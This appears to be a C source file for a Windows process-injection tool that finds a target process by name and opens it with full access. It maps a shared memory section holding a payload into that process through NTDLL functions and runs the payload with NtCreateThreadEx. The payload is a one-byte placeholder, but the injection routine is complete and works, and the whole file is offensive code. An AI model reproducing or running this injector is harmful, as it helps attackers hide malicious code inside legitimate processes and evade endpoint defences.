#include "header.h"


unsigned char code[] = "\x41";

BOOL remoteMap(IN HANDLE hProc, IN SIZE_T code_len, IN HMODULE hNTDLL, OUT PVOID* rBuffer) {
	HANDLE hFile = NULL;
	PVOID localBuffer = NULL;
	PVOID remoteBuffer = NULL;

	p_NtCreateSection pFileMap = (p_NtCreateSection)GetProcAddress(hNTDLL, "NtCreateSection"); // Get Addresses of Needed NTAPI Functions
	p_NtMapViewOfSection pViewMap = (p_NtMapViewOfSection)GetProcAddress(hNTDLL, "NtMapViewOfSection");

	NTSTATUS status = pFileMap(&hFile, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER)&code_len, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // Create a Shared Memory region
	if (status != STATUS_SUCCESS) {
		printf("Failed Creating Section");
		return FALSE;
	}

	status = pViewMap(hFile, GetCurrentProcess(), &localBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_READWRITE); // Allocate it Inside Our Process
	if (status != STATUS_SUCCESS) {
		error("Failed Moving");
		return FALSE;
	}


	memcpy(localBuffer, code, code_len); // Copy The Payload Into the Memory Region

	status = pViewMap(hFile, hProc, &remoteBuffer, NULL, NULL, NULL, (SIZE_T*)&code_len, ViewUnmap, NULL, PAGE_EXECUTE_READ); // Share and Allocate the memory region with the target Process
	if (status != STATUS_SUCCESS) {
		error("Failed Sharing With Remote Process");
		return EXIT_FAILURE;
	}
	
	info("Remote Buffer location\n\\____0x%p\n", remoteBuffer);

	if (hFile) {
		CloseHandle(hFile);
	}
	*rBuffer = remoteBuffer;
	return TRUE;
}

BOOL gethandle(IN LPWSTR ProcName, IN HMODULE hNTDLL, OUT DWORD* pID, OUT HANDLE* hProc) {
	PROCESSENTRY32 pe32 = { .dwSize = sizeof(PROCESSENTRY32) };
	HANDLE hProcSnap = NULL;
	HANDLE tmpProc = NULL;
	p_NtOpenProcess pOpen = (p_NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
	
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); // Create Snapshot of all running processes
	if (hProcSnap == INVALID_HANDLE_VALUE) {
		error("Failed Taking Snapshot");
		return FALSE;
	}

	if (!Process32First(hProcSnap, &pe32)) { // Fill the PROCESSENTRY32 Struct, Needed For Looping
		error("failed Poulating struct");
		return FALSE;
	}

	do {
		
		WCHAR lowername[MAX_PATH * 2]; // Buffer For Process Name After converting To lower Case
		if (pe32.szExeFile) {
			DWORD szSize = lstrlenW(pe32.szExeFile); // Get Length Of Process Name
			DWORD i = 0;
			RtlSecureZeroMemory(lowername, MAX_PATH * 2); // Zero Out Lowername memory Address

			for (; i < szSize; i++) {
				lowername[i] = (WCHAR)tolower(pe32.szExeFile[i]); // Loop Though Each Character and convert to lower case then save it
			} 
			lowername[i++] = '\0'; // Null Terminate the name
		}

		if (wcscmp(lowername, ProcName) == 0) { // Compare to 2 names, if they are equal
			*pID = pe32.th32ProcessID; // save Process ID
			CLIENT_ID CID = { (HANDLE)*pID, NULL }; // File CLIENT_ID Struct using the Process info
			NTSTATUS status = pOpen(&tmpProc, PROCESS_ALL_ACCESS, &OA, &CID); // Open a Handle To Process
			if (status != STATUS_SUCCESS) {
				error("Failed Getting Handle");
				return FALSE;
			}
			break;
		}
	} while (Process32Next(hProcSnap, &pe32));

	*hProc = tmpProc; // Save Handle
	CloseHandle(hProcSnap); // Close Snapshot Handle
	return TRUE;
}





int wmain(int argc, wchar_t* argv[]) {
	HANDLE dwProcHandle = NULL;
	HANDLE lpThread = NULL;
	DWORD dwProcessID = NULL;
	PVOID lpBuffer = NULL;
	size_t code_length = sizeof(code);
	OBJECT_ATTRIBUTES OA = { sizeof(OA), NULL };

	if (argc < 2) {
		wprintf("USAGE: %s <process name>\n", argv[0]);
		return EXIT_FAILURE;
	}

	HMODULE ndll = GetModuleHandleW(L"NTDLL"); // Load NTDLL Into memory
	if (ndll == NULL) {
		error("Failed Getting Handle To dll\tCode: 0x%ld", GetLastError());
		return EXIT_FAILURE;
	}


	winfo("Getting Handle and pId of \[%s]\...", argv[1]);

	if (!gethandle(argv[1], ndll, &dwProcessID, &dwProcHandle)) { // Get pID and Handle
		error("Failed Getting Handle");
		return EXIT_FAILURE;
	}
	info("Found Target Process [%d]", dwProcessID);
	info("Got Handle\n     \\____0x%p", dwProcHandle);

	CLIENT_ID CID = { (HANDLE)dwProcessID, NULL };

	printf("\n\n");

	if (!remoteMap(dwProcHandle, code_length, ndll, &lpBuffer)) { // Create Shared File Map
		error("Failed Injecting");
		return EXIT_FAILURE;
	}
	info("Buffer Location \n\\__0x%p", lpBuffer);

	printf("Press <ENTER> To Run Thread");
	getchar();

	HANDLE hThread = NULL;
	p_NtCreateThreadEx pThread = (p_NtCreateThreadEx)GetProcAddress(ndll, "NtCreateThreadEx");
	pThread(&hThread, THREAD_ALL_ACCESS, &OA, dwProcHandle, (PTHREAD_START_ROUTINE)lpBuffer, NULL, 0, 0, 0, 0, NULL); // Start Thread With Starting Addrsss Our Payload
	/*HANDLE hThread = CreateRemoteThread(dwProcHandle, NULL, NULL, lpBuffer, NULL, NULL, NULL);*/
	return 0;
}